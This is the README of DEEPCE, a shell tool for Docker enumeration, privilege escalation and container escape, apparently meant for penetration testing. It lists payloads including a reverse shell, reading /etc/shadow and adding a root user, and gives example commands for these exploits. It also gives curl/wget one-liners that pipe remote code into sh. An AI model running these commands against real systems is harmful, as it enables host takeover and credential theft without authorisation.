# deepce

```
                      ##         .
                ## ## ##        ==
             ## ## ## ##       ===
         /"""""""""""""""""\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/
            \____\_______/
          __                        
     ____/ /__  ___  ____  ________ 
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/
```

![ShellCheck](https://github.com/stealthcopter/deepce/workflows/ShellCheck/badge.svg)
![ContainerTests](https://github.com/stealthcopter/deepce/workflows/ContainerTests/badge.svg)
<a href="https://www.buymeacoffee.com/stealthcopter"><img src="https://cdn.buymeacoffee.com/buttons/v2/arial-yellow.png" height="20px"></a>

[![Twitter](https://img.shields.io/badge/-@stealthcopter-%232B90D9?style=for-the-badge&logo=twitter&logoColor=white&label=twitter)](https://twitter.com/stealthcopter)

[Website](https://stealthcopter.github.io/deepce/)

Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)

In order for it to be compatible with the maximum number of containers DEEPCE is written in pure `sh` with no dependencies. It will make use of additional tools such as curl, nmap, nslookup and dig if available but for the most part is not reliant upon them for enumeration.

None of the enumeration should touch the disk, however most of the exploits create new containers which will cause disk writes, and some exploits will overwrite runC which can be destructive, so be careful!

Please see below for a list of the enumerations, exploits and payloads DEEPCE can use. If you have ideas for anymore please submit an issue in github!

# Downloading

DEEPCE can be downloaded onto a host or container using one of the following one-liners. Tip: download to `/dev/shm` to avoid touching the disk.

```bash
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
# Or using python requests
python -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content)' > deepce.sh 
python3 -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content.decode("utf-8"))' > deepce.sh  
```

# Support
If you love what I'm doing with Deepce and my other projects, you can now support my work directly! By buying me a coffee ☕, you're not just fueling my caffeine needs – you're helping me dedicate more time to developing and improving these open source projects. Every coffee counts and brings more innovation to the cybersecurity world. Thank you for your support – it means the world to me and the open source community!

<a href="https://www.buymeacoffee.com/stealthcopter"><img src="https://cdn.buymeacoffee.com/buttons/v2/arial-yellow.png" height="50px"></a>

# Screenshots
For more please view the [docs folder](https://github.com/stealthcopter/deepce/tree/main/docs)
![screenshot1](docs/images/ubuntu-install-tools.png "Screenshot 1")

## Enumerations

The following is the list of enumerations performed by DEEPCE. 

- Container ID & name (via reverse dns)
- Container IP / DNS Server
- Docker Version
- Interesting mounts
- Passwords in common files
- Environment variables
- Password hashes
- Common sensitive files stored in containers
- Other containers on same network
- Port scan other containers, and the host machine itself
- Find exposed docker sock

## Exploits

- Docker Group Privilege Escalation
- Privileged mode host command execution
- Exposed Docker Sock

## Payloads

For each of the exploits above payloads can be defined in order to exploit the host system. These include:

- Reverse TCP shell
- Print /etc/shadow
- Add new root user
- Run custom commands
- Run custom payload binaries

# Examples
```bash
# Make the script executable and then run it
chmod +x ./deepce.sh
./deepce.sh 
```

## Exploits
The following examples show the different kinds of exploits that can be performed and the avaliable payloads.

- Exploit a privileged container to create a new root user on the host operating system:
```bash
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
```

- Exploit a writable docker sock file in order to print the contents of `/etc/shadow`
```bash
./deepce.sh --no-enumeration --exploit SOCK --shadow
```

- Escalate to root via membership to the docker group on a host and run a custom payload
```bash
./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
```

# Advanced Usage

It is possible to download and run deepce without touching the disk, however you will be unable to easily set arguments (direct manipulation of variables is possible using export).

```bash
wget -O - https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh
```

# Inspiration

There are some great container enumeration/escape scripts and enumeration tools that I've got inspiration from when writing this. However I felt the need to write one purely in `sh` in order to avoid having to install go / ruby dependencies or be reliant on a static binary. I also wanted to be able to perform more enumerations to try to discover what the docker container is as during as test we may end up inside an unknown container. The number of things this script can enumerate got away from me as every time I added something new I thought of more additional things I could add.

- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [BotB](https://github.com/brompwnie/botb)
- [Harpoon](https://github.com/ProfessionallyEvil/harpoon)

# Resources

Developers looking for Docker security tips
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md


# Contributing

I welcome pull requests, issues and feedback.

- Fork it
- Create your feature branch (git checkout -b my-new-feature)
- Commit your changes (git commit -am 'Added some feature')
- Push to the branch (git push origin my-new-feature)
- Create new Pull Request
